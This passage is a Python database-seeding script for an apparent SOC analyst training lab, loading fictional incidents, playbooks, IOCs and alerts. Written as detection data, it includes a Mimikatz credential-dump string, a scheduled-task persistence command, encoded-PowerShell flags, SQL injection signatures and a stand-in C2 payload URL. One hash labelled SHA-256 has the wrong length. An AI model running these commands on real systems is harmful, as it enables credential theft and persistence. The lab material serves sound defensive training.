import json
from datetime import datetime, timedelta
from sqlalchemy.orm import Session
from app.database.connection import engine, Base
from app.models.user import User
from app.models.host import Host
from app.models.event import Event
from app.models.alert import Alert
from app.models.incident import Incident
from app.models.investigation import Investigation
from app.models.ioc import IOC
from app.models.lab import Lab
from app.models.mitre import MitreTechnique
from app.models.playbook import Playbook
from app.models.report import Report

def reset_and_seed_database(db: Session):
    # Re-create all tables
    Base.metadata.create_all(bind=engine)

    # Clear existing data safely
    db.query(Report).delete()
    db.query(Investigation).delete()
    db.query(Alert).delete()
    db.query(IOC).delete()
    db.query(Incident).delete()
    db.query(Event).delete()
    db.query(Host).delete()
    db.query(User).delete()
    db.query(Lab).delete()
    db.query(MitreTechnique).delete()
    db.query(Playbook).delete()
    db.commit()

    now = datetime.utcnow()

    # 1. Users
    users_data = [
        User(username="alex.analyst", email="alex.analyst@sentinellab.local", role="Lead SOC L1 Analyst"),
        User(username="sarah.blue", email="sarah.blue@sentinellab.local", role="SOC L1 Analyst"),
        User(username="marcus.triage", email="marcus.triage@sentinellab.local", role="Junior Incident Responder"),
        User(username="guest.student", email="student@sentinellab.local", role="Security Student"),
    ]
    db.add_all(users_data)
    db.commit()

    # 2. Hosts
    hosts_data = [
        Host(hostname="DC-PRIMARY.corp.local", ip_address="192.168.1.20", os_type="Windows Server 2022", status="Healthy", role="Domain Controller", monitored=True),
        Host(hostname="SRV-RDP-GATEWAY.corp.local", ip_address="192.168.1.50", os_type="Windows Server 2019", status="Investigating", role="RDP Gateway", monitored=True),
        Host(hostname="DMZ-WEB01.corp.local", ip_address="192.168.1.10", os_type="Ubuntu 22.04 LTS", status="Alerting", role="E-Commerce Web Server", monitored=True),
        Host(hostname="WORKSTATION-CEO.corp.local", ip_address="192.168.1.140", os_type="Windows 11 Pro", status="Quarantined", role="Executive Laptop", monitored=True),
        Host(hostname="DESKTOP-FIN02.corp.local", ip_address="192.168.1.105", os_type="Windows 10 Enterprise", status="Healthy", role="Finance Workstation", monitored=True),
        Host(hostname="DNS-CORP.corp.local", ip_address="192.168.1.2", os_type="Debian 12", status="Healthy", role="Internal DNS Resolver", monitored=True),
        Host(hostname="MAIL-GATEWAY.corp.local", ip_address="192.168.1.25", os_type="CentOS Stream 9", status="Healthy", role="Email Security Appliance", monitored=True),
        Host(hostname="EDGE-ROUTER.corp.local", ip_address="192.168.1.1", os_type="Cisco IOS-XE", status="Alerting", role="Edge Perimeter Router", monitored=True),
    ]
    db.add_all(hosts_data)
    db.commit()

    # 3. MITRE ATT&CK Techniques
    mitre_data = [
        MitreTechnique(
            technique_id="T1110.001",
            name="Password Guessing",
            tactic="Credential Access",
            description="Adversaries may systematically guess passwords to gain unauthorized access to target accounts.",
            detection_approach="Monitor Windows Event ID 4625 for rapid sequential logon failures from identical source IP addresses.",
            data_sources="Authentication Logs, Active Directory Auditing",
            related_labs_json=json.dumps([1]),
            related_playbooks_json=json.dumps(["Brute Force Response Playbook"])
        ),
        MitreTechnique(
            technique_id="T1046",
            name="Network Service Scanning",
            tactic="Discovery",
            description="Adversaries may attempt to get a listing of services running on remote hosts to identify exploitable entry points.",
            detection_approach="Inspect firewall deny/reject logs for sequential destination ports scanned within a short time threshold.",
            data_sources="Firewall Logs, NetFlow, NIDS Telemetry",
            related_labs_json=json.dumps([2]),
            related_playbooks_json=json.dumps(["Port Scan Investigation Playbook"])
        ),
        MitreTechnique(
            technique_id="T1059.001",
            name="Command and Scripting Interpreter: PowerShell",
            tactic="Execution",
            description="Adversaries may abuse PowerShell commands and scripts for stealthy execution and evasion of defenses.",
            detection_approach="Audit Process Creation (4688), PowerShell Script Block Logging (4104), and look for flags like -Enc, -ExecutionPolicy Bypass, DownloadString.",
            data_sources="Process Execution, Command-Line Arguments, Script Logs",
            related_labs_json=json.dumps([3]),
            related_playbooks_json=json.dumps(["Suspicious PowerShell Playbook"])
        ),
        MitreTechnique(
            technique_id="T1566.001",
            name="Phishing: Spearphishing Attachment",
            tactic="Initial Access",
            description="Adversaries may send spearphishing emails with malicious attachments to gain code execution upon open.",
            detection_approach="Examine email gateway headers for SPF/DKIM authentication failures, double extensions (.pdf.exe), and macro-enabled documents.",
            data_sources="Email Gateway, Endpoint File Creation, Antivirus",
            related_labs_json=json.dumps([4]),
            related_playbooks_json=json.dumps(["Phishing Investigation Playbook"])
        ),
        MitreTechnique(
            technique_id="T1071.001",
            name="Application Layer Protocol: Web Protocols",
            tactic="Command and Control",
            description="Adversaries may communicate using application layer protocols (HTTP/HTTPS) to blend in with normal network traffic.",
            detection_approach="Correlate outbound proxy and DNS logs against threat intelligence feeds for malicious hashes and unregistered domain names.",
            data_sources="DNS Queries, Web Proxy Logs, Host Network Sockets",
            related_labs_json=json.dumps([5]),
            related_playbooks_json=json.dumps(["Malware IOC Playbook"])
        ),
        MitreTechnique(
            technique_id="T1190",
            name="Exploit Public-Facing Application",
            tactic="Initial Access",
            description="Adversaries may attempt to exploit vulnerabilities such as SQL injection in public web applications to steal data or execute commands.",
            detection_approach="Monitor HTTP request URIs and query parameters for SQL syntax (UNION SELECT, OR 1=1, comment tokens '--').",
            data_sources="Web Application Firewall (WAF), Web Server Access Logs",
            related_labs_json=json.dumps([6]),
            related_playbooks_json=json.dumps(["Web Application Attack Playbook"])
        ),
        MitreTechnique(
            technique_id="T1498.001",
            name="Network Denial of Service: Direct Network Flood",
            tactic="Impact",
            description="Adversaries may direct high volumes of network traffic to saturate bandwidth and crash public services.",
            detection_approach="Inspect router interface metrics and netflow anomalies for abnormal packets-per-second surges exceeding 10x baseline.",
            data_sources="Flow Telemetry, Router Interface Counters, Perimeter Firewall",
            related_labs_json=json.dumps([7]),
            related_playbooks_json=json.dumps(["DDoS Mitigation Playbook"])
        ),
    ]
    db.add_all(mitre_data)
    db.commit()

    # 4. SOC Playbooks
    playbooks_data = [
        Playbook(
            title="Brute Force Response Playbook",
            category="Authentication",
            trigger_condition="Alert triggered by 3+ consecutive failed logins (Event ID 4625) followed by possible success or high frequency from an untrusted source IP.",
            initial_validation="Verify if the targeted account is valid in Active Directory. Check if the source IP is internal VPN or external public subnet.",
            steps_json=json.dumps([
                "Step 1: Check SIEM for Event ID 4625 logs. Extract source IP, target account, and timestamp interval.",
                "Step 2: Determine if any Event ID 4624 (Successful Logon) occurred from that same source IP within 15 minutes.",
                "Step 3: If no successful logon, check account lockout status. If account is locked, verify with user before unlock.",
                "Step 4: If successful logon observed, immediately treat as ACCOUNT COMPROMISE. Escalate to Incident Response.",
                "Step 5: Apply temporary firewall ACL block on the offending source IP address."
            ]),
            evidence_checklist_json=json.dumps([
                "Windows Event ID 4625 logs (Failed attempts count)",
                "Windows Event ID 4624 log (if compromised)",
                "External IP WHOIS / GeoIP lookup report",
                "Firewall connection log showing inbound RDP/SSH packets"
            ]),
            escalation_criteria="Escalate immediately if a successful logon (4624) is confirmed from the brute-forcing IP address or if a domain admin account was targeted.",
            containment_actions="Reset target user Active Directory credentials; terminate active user sessions; block source IP in perimeter firewall.",
            documentation_requirements="Document all timestamps, attacker IP, affected username, number of attempts, and whether compromise occurred.",
            mitre_technique_id="T1110.001"
        ),
        Playbook(
            title="Phishing Investigation Playbook",
            category="Phishing",
            trigger_condition="User reported email or email security gateway alert for suspicious link, spoofed domain, or suspicious attachment.",
            initial_validation="Inspect email headers: check Return-Path vs From header, SPF authentication results (pass/fail), and DKIM cryptographic signature.",
            steps_json=json.dumps([
                "Step 1: Obtain raw email (.eml / .msg). Inspect headers for SPF=fail or DMARC=reject.",
                "Step 2: Safely extract URLs and attachment hashes without clicking or executing.",
                "Step 3: Run IOC check against VirusTotal / internal threat intel for URL domain and attachment SHA-256 hash.",
                "Step 4: Search mail gateway logs to determine how many internal users received the same message.",
                "Step 5: Query SIEM/EDR to check if any user executed the attachment or browsed to the destination link.",
                "Step 6: Purge malicious email from all mailboxes across the organization."
            ]),
            evidence_checklist_json=json.dumps([
                "Raw email header text (.eml format)",
                "Extracted sender IP and domain",
                "Attachment SHA-256 hash",
                "Mail gateway recipient recipient query results"
            ]),
            escalation_criteria="Escalate if telemetry confirms any internal employee opened the weaponized attachment or submitted credentials to the phishing portal.",
            containment_actions="Block sender domain & source IP on mail gateway; block malicious URL in web proxy; purge email from inbox; reset affected credentials.",
            documentation_requirements="Log email subject, sender address, sender IP, target recipient list, malware hash, and containment timestamp.",
            mitre_technique_id="T1566.001"
        ),
        Playbook(
            title="Malware IOC Investigation Playbook",
            category="Malware",
            trigger_condition="EDR or network sensor alert matching a known malicious file hash, command-and-control (C2) IP, or beaconing domain.",
            initial_validation="Verify alert authenticity against endpoint telemetry. Confirm if the process is currently executing or if file exists on disk.",
            steps_json=json.dumps([
                "Step 1: Identify infected endpoint hostname, IP, and logged-in user.",
                "Step 2: Query EDR for process tree (parent-child relationship) and persistent registry modifications.",
                "Step 3: Isolate the endpoint from the network immediately via EDR isolation command.",
                "Step 4: Check firewall and proxy logs for any outbound network connections to the C2 IP/domain.",
                "Step 5: Extract file sample and collect volatile forensic memory triage.",
                "Step 6: Remediate: terminate process, remove malicious binary, and audit adjacent endpoints."
            ]),
            evidence_checklist_json=json.dumps([
                "Binary SHA-256 file hash",
                "C2 IP and domain destination",
                "Parent process name and command line",
                "Endpoint network connection history"
            ]),
            escalation_criteria="Escalate to Incident Commander if lateral movement or privilege escalation is detected on the local subnet.",
            containment_actions="Isolate affected host from enterprise network; block C2 IP and domain at boundary firewall; revoke endpoint Kerberos tickets.",
            documentation_requirements="Complete IOC documentation table, infected host details, containment time, and eradication evidence.",
            mitre_technique_id="T1071.001"
        ),
        Playbook(
            title="Suspicious PowerShell Playbook",
            category="Endpoint",
            trigger_condition="Windows Event ID 4688 or Sysmon 1 alert showing powershell.exe with -enc, -w hidden, or WebClient download strings.",
            initial_validation="Check parent process (e.g., cmd.exe, winword.exe, wscript.exe). Office products launching PowerShell is almost always malicious.",
            steps_json=json.dumps([
                "Step 1: Retrieve full command line from Event ID 4688. Check for base64 encoded strings.",
                "Step 2: Safely decode the base64 payload in a sandboxed/offline text editor. Do NOT execute it.",
                "Step 3: Identify any URLs, downloaded scripts, or script block executions (Event ID 4104).",
                "Step 4: Inspect host network traffic for outbound connections initiated by powershell.exe.",
                "Step 5: Kill the suspicious PowerShell process and isolate host if secondary payloads were fetched."
            ]),
            evidence_checklist_json=json.dumps([
                "Event ID 4688 full command line",
                "Decoded script string content",
                "Parent process name and PID",
                "Outbound connection attempts in firewall logs"
            ]),
            escalation_criteria="Escalate if decoded script retrieved secondary stage binaries or modified registry Run keys.",
            containment_actions="Kill active PID; quarantine host; review scheduled tasks and startup keys for persistence.",
            documentation_requirements="Document decoded payload, parent process, user identity, and detection rule ID.",
            mitre_technique_id="T1059.001"
        ),
        Playbook(
            title="Port Scan Investigation Playbook",
            category="Network",
            trigger_condition="Firewall or NIDS alert indicating horizontal or vertical port scanning activity.",
            initial_validation="Check if the source IP belongs to authorized internal vulnerability scanning tools (e.g. Nessus, Qualys). If authorized, close as False Positive.",
            steps_json=json.dumps([
                "Step 1: Extract source IP, target IP, scanned port range, and protocol (TCP/UDP).",
                "Step 2: Cross-reference source IP with approved internal IT/Security scanners schedule.",
                "Step 3: If unauthorized, inspect firewall logs to confirm all connection attempts were REJECTED or DROPPED.",
                "Step 4: Verify whether any scanned port returned an open SYN-ACK handshake.",
                "Step 5: Apply dynamic firewall shun / block rule against the external source IP."
            ]),
            evidence_checklist_json=json.dumps([
                "Firewall connection drops log table",
                "Scanned port distribution summary",
                "Source IP intelligence report"
            ]),
            escalation_criteria="Escalate if scanning is followed by targeted exploit attempts on an identified open port.",
            containment_actions="Block offending source IP at boundary firewall; review target server exposure.",
            documentation_requirements="Document source IP, timestamp range, targeted hosts, ports scanned, and firewall rule applied.",
            mitre_technique_id="T1046"
        )
    ]
    db.add_all(playbooks_data)
    db.commit()

    # 5. Incidents
    incidents_data = [
        Incident(
            title="Targeted RDP Brute Force & Domain Compromise Attempt",
            severity="HIGH",
            status="Investigating",
            stage="Investigation",
            summary="Attacker IP 198.51.100.23 conducted sequential brute-force attempts targeting SRV-RDP-GATEWAY before attempting credential access on administrator account.",
            affected_host="SRV-RDP-GATEWAY.corp.local",
            affected_user="administrator",
            timeline_json=json.dumps([
                {"timestamp": (now - timedelta(hours=3)).strftime("%Y-%m-%d %H:%M:%S"), "stage": "Detection", "action": "Firewall logged 45 connection attempts to port 3389 from 198.51.100.23.", "analyst": "Detection Engine"},
                {"timestamp": (now - timedelta(hours=2, minutes=50)).strftime("%Y-%m-%d %H:%M:%S"), "stage": "Triage", "action": "Windows Security Event 4625 logged multiple failed authentication attempts.", "analyst": "Sarah Blue"},
                {"timestamp": (now - timedelta(hours=2, minutes=30)).strftime("%Y-%m-%d %H:%M:%S"), "stage": "Investigation", "action": "Analyst verified account lockout triggered; verified no successful logon 4624 occurred.", "analyst": "Sarah Blue"},
                {"timestamp": (now - timedelta(hours=2)).strftime("%Y-%m-%d %H:%M:%S"), "stage": "Containment", "action": "Source IP 198.51.100.23 permanently blacklisted at edge firewall.", "analyst": "Alex Analyst"}
            ]),
            analyst_notes="Account lockout policy prevented compromise. Offending IP added to firewall boundary drop list.",
            actions_json=json.dumps(["Blocked source IP 198.51.100.23", "Enforced RDP Gateway IP whitelist", "Verified domain admin password complexity"]),
            conclusion="Attack neutralized before foothold established. No data exfiltration detected."
        ),
        Incident(
            title="Executive Laptop Phishing & Obfuscated PowerShell Dropper",
            severity="CRITICAL",
            status="Contained",
            stage="Containment",
            summary="User Alex Executive received spearphishing email with fake invoice attachment which spawned obfuscated PowerShell and beaconed to C2 IP 45.33.32.156.",
            affected_host="WORKSTATION-CEO.corp.local",
            affected_user="alex.executive",
            timeline_json=json.dumps([
                {"timestamp": (now - timedelta(hours=5)).strftime("%Y-%m-%d %H:%M:%S"), "stage": "Detection", "action": "Mail gateway detected spoofed invoice from bankofamer1ca-notice.com.", "analyst": "Detection Engine"},
                {"timestamp": (now - timedelta(hours=4, minutes=45)).strftime("%Y-%m-%d %H:%M:%S"), "stage": "Triage", "action": "Workstation CEO executed invoice.pdf.exe spawning powershell.exe -enc.", "analyst": "Alex Analyst"},
                {"timestamp": (now - timedelta(hours=4, minutes=30)).strftime("%Y-%m-%d %H:%M:%S"), "stage": "Investigation", "action": "PowerShell decoded to WebClient download string targeting malicious-c2.net.", "analyst": "Alex Analyst"},
                {"timestamp": (now - timedelta(hours=4)).strftime("%Y-%m-%d %H:%M:%S"), "stage": "Containment", "action": "Endpoint WORKSTATION-CEO isolated from enterprise network.", "analyst": "Alex Analyst"}
            ]),
            analyst_notes="Endpoint isolated within 15 minutes of C2 beacon. Forensic disk image preserved.",
            actions_json=json.dumps(["Isolated WORKSTATION-CEO from network", "Terminated powershell.exe and svchost_updater.exe", "Blocked C2 IP 45.33.32.156 in firewall", "Reset Alex Executive credentials"]),
            conclusion="Malware eradicated from endpoint. Host is being reimaged following forensic backup."
        ),
        Incident(
            title="E-Commerce DMZ Web Server SQL Injection Exploitation Attempt",
            severity="HIGH",
            status="Open",
            stage="Triage",
            summary="Automated scanner sqlmap detected attempting blind and union-based SQL injection on DMZ-WEB01 /products.php endpoint.",
            affected_host="DMZ-WEB01.corp.local",
            affected_user="www-data",
            timeline_json=json.dumps([
                {"timestamp": (now - timedelta(hours=1, minutes=20)).strftime("%Y-%m-%d %H:%M:%S"), "stage": "Detection", "action": "Web server logged repeated HTTP 500 responses containing UNION SELECT statements.", "analyst": "Detection Engine"},
                {"timestamp": (now - timedelta(hours=1)).strftime("%Y-%m-%d %H:%M:%S"), "stage": "Triage", "action": "Analyst reviewing database access logs for data exfiltration indicators.", "analyst": "Marcus Triage"}
            ]),
            analyst_notes="WAF signature updated to block sqlmap user-agent and union select payloads.",
            actions_json=json.dumps(["Updated ModSecurity WAF rules", "Rate limited /products.php route"]),
            conclusion="Under active review. Web development team notified to use parameterized queries."
        ),
        Incident(
            title="Perimeter Edge Router Volumetric SYN Flood DDoS",
            severity="CRITICAL",
            status="Contained",
            stage="Recovery",
            summary="A volumetric SYN flood peaking at 85k pps impacted external edge connectivity on port 80/443 for 12 minutes.",
            affected_host="EDGE-ROUTER.corp.local",
            affected_user=None,
            timeline_json=json.dumps([
                {"timestamp": (now - timedelta(hours=6)).strftime("%Y-%m-%d %H:%M:%S"), "stage": "Detection", "action": "Ingress traffic spiked to 450 Mbps on WAN interface.", "analyst": "Detection Engine"},
                {"timestamp": (now - timedelta(hours=5, minutes=50)).strftime("%Y-%m-%d %H:%M:%S"), "stage": "Containment", "action": "ISP upstream scrub center routing activated.", "analyst": "Alex Analyst"},
                {"timestamp": (now - timedelta(hours=5, minutes=30)).strftime("%Y-%m-%d %H:%M:%S"), "stage": "Recovery", "action": "Perimeter latency dropped back to 14ms nominal baseline.", "analyst": "Marcus Triage"}
            ]),
            analyst_notes="Upstream BGP Anycast scrubbing mitigated flood. No internal systems crashed.",
            actions_json=json.dumps(["Activated BGP flowspec DDoS protection", "Enabled SYN cookies on edge gateway"]),
            conclusion="Mitigation successful. Network availability restored to 100%."
        ),
        Incident(
            title="Reconnaissance Port Scan Against Corporate DMZ Subnet",
            severity="MEDIUM",
            status="Resolved",
            stage="Lessons Learned",
            summary="External scanner 203.0.113.88 executed rapid SYN scans across ports 21, 22, 80, 443, and 3389.",
            affected_host="DMZ-WEB01.corp.local",
            affected_user=None,
            timeline_json=json.dumps([
                {"timestamp": (now - timedelta(hours=8)).strftime("%Y-%m-%d %H:%M:%S"), "stage": "Detection", "action": "Firewall logged 120 connection drops within 3 seconds.", "analyst": "Detection Engine"},
                {"timestamp": (now - timedelta(hours=7, minutes=45)).strftime("%Y-%m-%d %H:%M:%S"), "stage": "Investigation", "action": "Confirmed all scanned ports were closed and packets dropped.", "analyst": "Sarah Blue"},
                {"timestamp": (now - timedelta(hours=7)).strftime("%Y-%m-%d %H:%M:%S"), "stage": "Resolved", "action": "Incident closed. Standard port scan reconnaissance with no breaches.", "analyst": "Sarah Blue"}
            ]),
            analyst_notes="Routine malicious internet scanner. All packets dropped as per firewall policy.",
            actions_json=json.dumps(["Automated 24h IP block in place"]),
            conclusion="Reconnaissance was entirely blocked at edge. Closed as Resolved."
        )
    ]
    db.add_all(incidents_data)
    db.commit()

    # 6. Indicators of Compromise (IOCs)
    iocs_data = [
        IOC(value="198.51.100.23", ioc_type="IP", confidence=95, source="RDP Brute Force Detection", related_incident_id=1, notes="Attacker source IP targeting RDP port 3389"),
        IOC(value="45.33.32.156", ioc_type="IP", confidence=100, source="C2 Beaconing EDR Log", related_incident_id=2, notes="Command and Control server hosting secondary payloads"),
        IOC(value="malicious-c2.net", ioc_type="Domain", confidence=95, source="PowerShell Script Decoder", related_incident_id=2, notes="Domain used for staging invoke.ps1 download"),
        IOC(value="bankofamer1ca-notice.com", ioc_type="Domain", confidence=90, source="Phishing Mail Gateway", related_incident_id=2, notes="Typosquatted domain mimicking financial institution"),
        IOC(value="http://malicious-c2.net/invoke.ps1", ioc_type="URL", confidence=95, source="PowerShell Command Line", related_incident_id=2, notes="Malicious staging payload URL in download cradle"),
        IOC(value="e3b0c44298fc1c149afbf4c8996fb924", ioc_type="Hash", confidence=100, source="Endpoint Antivirus EDR", related_incident_id=2, notes="SHA-256 hash of dropper executable svchost_updater.exe"),
        IOC(value="7d4a6f23b89e1a4c9d5e6f7a8b9c0d1e", ioc_type="Hash", confidence=85, source="Sandbox Detonation", related_incident_id=2, notes="MD5 hash of invoice_2026.pdf.exe attachment"),
        IOC(value="invoice_2026.pdf.exe", ioc_type="Filename", confidence=95, source="Email Attachment Inspector", related_incident_id=2, notes="Double-extension phishing dropper executable"),
        IOC(value="svchost_updater.exe", ioc_type="Filename", confidence=100, source="Sysmon Process Creation", related_incident_id=2, notes="Persistence binary masquerading as Windows service host"),
        IOC(value="billing@bankofamer1ca-notice.com", ioc_type="Email", confidence=90, source="Phishing Header Parser", related_incident_id=2, notes="Sender email address used in spearphishing lure"),
        IOC(value="198.51.100.99", ioc_type="IP", confidence=90, source="Nginx Access Log", related_incident_id=3, notes="Source IP executing automated sqlmap injections"),
        IOC(value="203.0.113.88", ioc_type="IP", confidence=80, source="Firewall Deny Log", related_incident_id=5, notes="Reconnaissance scanner IP probing corporate perimeter"),
        IOC(value="alex.executive", ioc_type="Username", confidence=75, source="Active Directory Audit", related_incident_id=2, notes="Targeted executive user account subject to credential reset"),
        IOC(value="administrator", ioc_type="Username", confidence=85, source="Windows Event 4625", related_incident_id=1, notes="Targeted privileged account in brute force attack"),
        IOC(value="c2-beacon.corp-sec.internal", ioc_type="Domain", confidence=90, source="Internal DNS Audit", related_incident_id=2, notes="DNS tunneling domain queried during beaconing stage"),
    ]
    db.add_all(iocs_data)
    db.commit()

    # 7. Alerts (20+ alerts)
    alerts_data = [
        Alert(
            title="High Volume Failed RDP Logons (Event 4625)",
            timestamp=now - timedelta(hours=3),
            severity="HIGH",
            source_ip="198.51.100.23",
            destination_ip="192.168.1.50",
            source_host="EXTERNAL-ATTACKER",
            destination_host="SRV-RDP-GATEWAY",
            username="administrator",
            event_type="FAILED_LOGIN",
            description="Detected 45 consecutive failed logon attempts for account administrator within 2 minutes.",
            detection_rule="BRUTE_FORCE_DETECTION",
            mitre_technique="T1110.001",
            status="Investigating",
            assigned_analyst="Sarah Blue",
            notes="Assigned to Sarah for review. Account lockout verified.",
            incident_id=1
        ),
        Alert(
            title="Suspicious Base64 Encoded PowerShell Execution",
            timestamp=now - timedelta(hours=4, minutes=45),
            severity="CRITICAL",
            source_ip="192.168.1.140",
            destination_ip="192.168.1.140",
            source_host="WORKSTATION-CEO",
            destination_host="WORKSTATION-CEO",
            username="alex.executive",
            event_type="SUSPICIOUS_PROCESS",
            description="PowerShell executed with -EncodedCommand, -WindowStyle Hidden, and execution policy bypass flags.",
            detection_rule="SUSPICIOUS_POWERSHELL",
            mitre_technique="T1059.001",
            status="Escalated",
            assigned_analyst="Alex Analyst",
            notes="Payload decoded to WebClient download string. Host quarantined.",
            incident_id=2
        ),
        Alert(
            title="Known Malicious C2 IP Communication Detected",
            timestamp=now - timedelta(hours=4, minutes=30),
            severity="CRITICAL",
            source_ip="192.168.1.140",
            destination_ip="45.33.32.156",
            source_host="WORKSTATION-CEO",
            destination_host="C2-SERVER",
            username="alex.executive",
            event_type="MALWARE_IOC",
            description="Outbound connection to known threat actor C2 node 45.33.32.156 on TCP port 443.",
            detection_rule="MALWARE_IOC_MATCH",
            mitre_technique="T1071.001",
            status="Escalated",
            assigned_analyst="Alex Analyst",
            notes="Associated with Incident #2.",
            incident_id=2
        ),
        Alert(
            title="Inbound Spearphishing Email with Failed SPF Check",
            timestamp=now - timedelta(hours=5),
            severity="MEDIUM",
            source_ip="185.220.101.5",
            destination_ip="192.168.1.25",
            source_host="MAIL-GATEWAY",
            destination_host="MAIL-CORP",
            username="alex.executive",
            event_type="PHISHING",
            description="Spoofed email from billing@bankofamer1ca-notice.com with attachment urgent_invoice_2026.pdf.exe.",
            detection_rule="PHISHING_DETECTION",
            mitre_technique="T1566.001",
            status="Escalated",
            assigned_analyst="Alex Analyst",
            notes="Malicious email purged from Exchange mailboxes.",
            incident_id=2
        ),
        Alert(
            title="SQL Injection Exploit Pattern in HTTP GET Parameter",
            timestamp=now - timedelta(hours=1, minutes=20),
            severity="HIGH",
            source_ip="198.51.100.99",
            destination_ip="192.168.1.10",
            source_host="ATTACKER-IP",
            destination_host="DMZ-WEB01",
            username="www-data",
            event_type="SQL_INJECTION",
            description="SQL injection probe UNION SELECT detected in URI query parameters for /products.php.",
            detection_rule="SQL_INJECTION_DETECTION",
            mitre_technique="T1190",
            status="New",
            assigned_analyst="Marcus Triage",
            notes="Marcus reviewing web server access log.",
            incident_id=3
        ),
        Alert(
            title="DDoS Volumetric Traffic Spike on Perimeter Edge",
            timestamp=now - timedelta(hours=6),
            severity="CRITICAL",
            source_ip="203.0.113.0/24",
            destination_ip="192.168.1.1",
            source_host="DISTRIBUTED-BOTNET",
            destination_host="EDGE-ROUTER",
            username=None,
            event_type="DDOS_ANOMALY",
            description="Bandwidth utilization surged to 450 Mbps with 85,000 packets per second TCP SYN flood.",
            detection_rule="DDOS_TRAFFIC_ANOMALY",
            mitre_technique="T1498.001",
            status="Resolved",
            assigned_analyst="Alex Analyst",
            notes="Upstream scrubbing successfully absorbed traffic.",
            incident_id=4
        ),
        Alert(
            title="Sequential TCP Port Scan on DMZ Perimeter",
            timestamp=now - timedelta(hours=8),
            severity="MEDIUM",
            source_ip="203.0.113.88",
            destination_ip="192.168.1.10",
            source_host="EXTERNAL-SCANNER",
            destination_host="DMZ-WEB01",
            username=None,
            event_type="PORT_SCAN",
            description="Source IP 203.0.113.88 probed 5 distinct TCP ports (21, 22, 80, 443, 3389) within 2 seconds.",
            detection_rule="PORT_SCAN_DETECTION",
            mitre_technique="T1046",
            status="Resolved",
            assigned_analyst="Sarah Blue",
            notes="All ports were closed. Packet dropped by firewall.",
            incident_id=5
        ),
        Alert(
            title="New User Account Created via Net User Command",
            timestamp=now - timedelta(hours=12),
            severity="MEDIUM",
            source_ip="192.168.1.105",
            destination_ip="192.168.1.20",
            source_host="DESKTOP-FIN02",
            destination_host="DC-PRIMARY",
            username="admin.backup",
            event_type="USER_CREATION",
            description="Windows Event 4720: A user account 'admin.backup' was created outside standard maintenance window.",
            detection_rule="ACCOUNT_CREATION_ANOMALY",
            mitre_technique="T1136.001",
            status="False Positive",
            assigned_analyst="Sarah Blue",
            notes="Confirmed IT SysAdmin scheduled maintenance task.",
            incident_id=None
        ),
        Alert(
            title="Firewall Drop: Inbound Telnet (Port 23) Probe",
            timestamp=now - timedelta(hours=14),
            severity="LOW",
            source_ip="185.190.140.22",
            destination_ip="192.168.1.1",
            source_host="EXTERNAL-PROBE",
            destination_host="EDGE-ROUTER",
            username=None,
            event_type="FIREWALL_DENY",
            description="Firewall dropped unauthorized TCP connection attempt to Telnet service port 23.",
            detection_rule="FIREWALL_DROP_RULE",
            mitre_technique="T1046",
            status="Resolved",
            assigned_analyst="Unassigned",
            notes="Automated internet background noise.",
            incident_id=None
        ),
        Alert(
            title="Multiple SSH Authentication Failures on Linux Web Server",
            timestamp=now - timedelta(hours=16),
            severity="MEDIUM",
            source_ip="198.51.100.44",
            destination_ip="192.168.1.10",
            source_host="EXTERNAL-BOT",
            destination_host="DMZ-WEB01",
            username="root",
            event_type="FAILED_LOGIN",
            description="12 failed SSH logins attempting username 'root' on Ubuntu web server.",
            detection_rule="BRUTE_FORCE_DETECTION",
            mitre_technique="T1110.001",
            status="Resolved",
            assigned_analyst="Marcus Triage",
            notes="Fail2Ban automatically banned source IP for 24 hours.",
            incident_id=None
        ),
        Alert(
            title="DNS Query for Dynamic DNS / Suspicious TLD",
            timestamp=now - timedelta(hours=18),
            severity="LOW",
            source_ip="192.168.1.88",
            destination_ip="192.168.1.2",
            source_host="DESKTOP-HR01",
            destination_host="DNS-CORP",
            username="john.hr",
            event_type="DNS_ANOMALY",
            description="Client queried free dynamic DNS domain update-check.duckdns.org.",
            detection_rule="SUSPICIOUS_DNS_TLD",
            mitre_technique="T1071.004",
            status="Resolved",
            assigned_analyst="Sarah Blue",
            notes="Verified as telemetry check from legitimate monitoring tool.",
            incident_id=None
        ),
        Alert(
            title="Local Security Group Membership Modified",
            timestamp=now - timedelta(hours=20),
            severity="HIGH",
            source_ip="192.168.1.20",
            destination_ip="192.168.1.20",
            source_host="DC-PRIMARY",
            destination_host="DC-PRIMARY",
            username="administrator",
            event_type="PRIVILEGE_ESCALATION",
            description="Windows Event 4728: A member was added to security-enabled global group 'Domain Admins'.",
            detection_rule="PRIVILEGE_GROUP_MODIFICATION",
            mitre_technique="T1098",
            status="Investigating",
            assigned_analyst="Alex Analyst",
            notes="Verifying IT Change Request ticket with Lead SysAdmin.",
            incident_id=None
        ),
        Alert(
            title="Outbound Cleartext FTP Connection Attempt",
            timestamp=now - timedelta(hours=22),
            severity="LOW",
            source_ip="192.168.1.105",
            destination_ip="198.51.100.12",
            source_host="DESKTOP-FIN02",
            destination_host="EXTERNAL-FTP",
            username="sarah.finance",
            event_type="NETWORK_ANOMALY",
            description="Internal workstation attempted outbound FTP connection on port 21. Policy requires SFTP.",
            detection_rule="UNENCRYPTED_PROTOCOL_POLICY",
            mitre_technique="T1048",
            status="Resolved",
            assigned_analyst="Sarah Blue",
            notes="Contacted user; reconfigured to secure SFTP port 22.",
            incident_id=None
        ),
        Alert(
            title="Mimikatz Signature String Flagged in Command Line",
            timestamp=now - timedelta(hours=24),
            severity="CRITICAL",
            source_ip="192.168.1.140",
            destination_ip="192.168.1.140",
            source_host="WORKSTATION-CEO",
            destination_host="WORKSTATION-CEO",
            username="alex.executive",
            event_type="MALWARE_IOC",
            description="Process creation command contained known credential dumper syntax 'sekurlsa::logonpasswords'.",
            detection_rule="MALWARE_IOC_MATCH",
            mitre_technique="T1003.001",
            status="Escalated",
            assigned_analyst="Alex Analyst",
            notes="Linked to Incident #2 post-exploitation phase.",
            incident_id=2
        ),
        Alert(
            title="Scheduled Task Created via Schtasks.exe",
            timestamp=now - timedelta(hours=26),
            severity="MEDIUM",
            source_ip="192.168.1.140",
            destination_ip="192.168.1.140",
            source_host="WORKSTATION-CEO",
            destination_host="WORKSTATION-CEO",
            username="alex.executive",
            event_type="PERSISTENCE_ATTEMPT",
            description="schtasks /create /tn 'SystemHealthCheck' /tr 'svchost_updater.exe' /sc onstart.",
            detection_rule="SCHEDULED_TASK_PERSISTENCE",
            mitre_technique="T1053.005",
            status="Escalated",
            assigned_analyst="Alex Analyst",
            notes="Persistence scheduled task removed from quarantined laptop.",
            incident_id=2
        ),
        Alert(
            title="Excessive 404 Not Found Web Requests (Directory Fuzzing)",
